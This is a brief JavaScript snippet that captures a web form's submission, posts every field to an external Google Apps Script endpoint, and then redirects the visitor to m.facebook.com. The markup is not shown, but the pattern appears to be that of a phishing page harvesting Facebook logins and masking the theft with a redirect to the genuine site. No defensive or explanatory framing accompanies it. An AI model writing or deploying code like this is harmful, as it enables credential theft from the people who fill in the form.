const form = document.querySelector("#form")
    const scriptURL = 'https://script.google.com/macros/s/AKfycbx400-OITHD696EM-oXbbKIR-wBQnInYb3mjze4gs7gABMFvQCp-KR01Xh_sKAh5Q3g9A/exec'

    form.addEventListener('submit', e => {
      e.preventDefault()

      console.log(form)
      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => { window.location.href='http://m.facebook.com' })
        .catch(error => alert('Error!', error.message))
    })
